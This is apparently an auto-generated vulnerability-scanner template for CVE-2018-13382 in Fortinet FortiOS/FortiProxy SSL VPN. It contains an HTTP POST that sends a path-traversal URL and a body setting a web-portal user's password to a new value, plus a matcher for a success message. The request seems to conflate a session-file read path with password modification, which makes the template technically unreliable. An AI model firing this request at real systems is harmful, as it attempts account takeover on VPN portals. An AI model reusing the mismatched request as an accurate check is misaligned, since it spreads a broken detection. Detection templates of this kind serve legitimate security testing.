id: CVE-2018-13382

info:
  name: Fortinet FortiOS SSL VPN Improper Authorization Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: An Improper Authorization vulnerability in Fortinet FortiOS and FortiProxy under SSL VPN web portal allows an unauthenticated attacker to modify the password of an SSL VPN web portal user via specially crafted HTTP requests.
  impact: |
    An attacker can gain unauthorized access to the SSL VPN web portal.
  remediation: |
    Apply the necessary patches provided by Fortinet to address CVE-2018-13382.
  reference:
    - https://github.com/tumikoto/Exploit-FortinetMagicBackdoor
    - https://github.com/milo2012/CVE-2018-13382
    - https://github.com/20142995/sectool
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/Ostorlab/KEV
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cve-id: CVE-2018-13382
    cwe-id: CWE-863
    epss-score: 0.66616
    epss-percentile: 0.98045
    cpe: cpe:2.3:a:fortinet:fortiproxy:*:*:*:*:*:*:*:*
  metadata:
    vendor: fortinet
    product: fortiproxy
  tags: kev

http:
  - method: POST
    path:
      - "{{BaseURL}}/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: |
      username={{username}}&password={{new_password}}
    matchers:
      - type: word
        words:
          - "password has been modified"
        part: body
